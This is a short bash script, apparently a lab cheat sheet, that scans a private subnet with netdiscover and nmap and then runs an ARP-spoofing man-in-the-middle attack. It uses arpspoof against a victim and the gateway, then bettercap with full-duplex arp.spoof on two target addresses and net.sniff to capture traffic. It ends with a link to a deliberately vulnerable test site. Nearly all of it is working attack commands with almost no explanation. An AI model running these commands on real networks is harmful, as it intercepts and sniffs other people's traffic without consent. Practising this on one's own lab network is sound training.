#!/usr/bin/bash

netdiscover -i eth1 -r 192.168.100.1/24

nmap -sn 192.168.100.1/24
nmap -T4 -F 192.168.100.1/24
nmap -sV -T4 -O -F --version-light 192.168.100.1/24


arp -a
# Spoof victim with fake mac from gateway
sudo arpspoof -i eth1 -t 192.168.100.101 192.168.100.1
# Spoof gateway with fake mac
sudo arpspoof -i eth1 -t 192.168.100.1 192.168.100.101




sudo bettercap -iface eth1

get *
get gateway*

help net.probe
net.probe on

net.show


#MAN in the middle

help arp.spoof
set arp.spoof.fullduplex true
# get ips from net.show
set arp.spoof.targets 192.168.100.101,192.168.100.102
arp.spoof on
#check victim
arp -a

net.sniff on

http://www.vulnweb.com/

